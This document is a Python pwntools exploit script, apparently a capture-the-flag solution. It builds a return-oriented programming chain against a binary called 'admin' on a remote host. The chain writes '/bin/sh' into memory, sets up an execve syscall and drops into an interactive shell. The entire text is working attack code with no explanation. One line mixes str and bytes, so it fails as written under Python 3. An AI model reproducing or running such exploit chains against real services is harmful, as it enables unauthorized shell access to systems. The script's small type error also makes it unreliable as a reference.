from pwn import *

'''
0x000000000040123c : syscall
0x000000000044bce9 : pop rdx ; pop rsi ; ret
0x0000000000415544 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x000000000048d102 : mov dword ptr [rax], edx ; ret

parameters:
rax = 0x3b
rdi='/bin/sh'
rsi=0x00
rdx=0x00
'''

r = remote('35.186.153.116',7002)
#r= process('./admin')

SYSCALL=0x000000000040123c
SET_RDX_RSI=0x000000000044bce9
SET_RAX=0x0000000000415544
SET_RDI=0x0000000000400686
WRITE_EDX_RAX = 0x000000000048d102

str_dest=0x006b6208  # someplace in a rw section

exploit=b'A'*72 # padding
exploit+=p64(SET_RDX_RSI)
exploit+=b'/bin\x00\x00\x00\x00' # set rdx to start of string
exploit+=p64(0x41414141)
exploit+=p64(SET_RAX)
exploit+=p64(str_dest) # rax to set addr
exploit+=p64(WRITE_EDX_RAX) # write mem
exploit+=p64(SET_RDX_RSI)
exploit+=b'/sh\x00\x00\x00\x00\x00' # last part of string...
exploit+=p64(0x41414141)
exploit+=p64(SET_RAX)
exploit+=p64(str_dest+4)
exploit+=p64(WRITE_EDX_RAX) # full string written


exploit+=p64(SET_RDX_RSI) # set up params...
exploit+=p64(0x0)
exploit+=p64(0x0)
exploit+=p64(SET_RDI)
exploit+=p64(str_dest)
exploit+=p64(SET_RAX)
exploit+=chr(0x3b)+"\x00"*7 # rax=0x3b
exploit+=p64(SYSCALL) # make the syscall

r.sendline(exploit)
r.interactive()

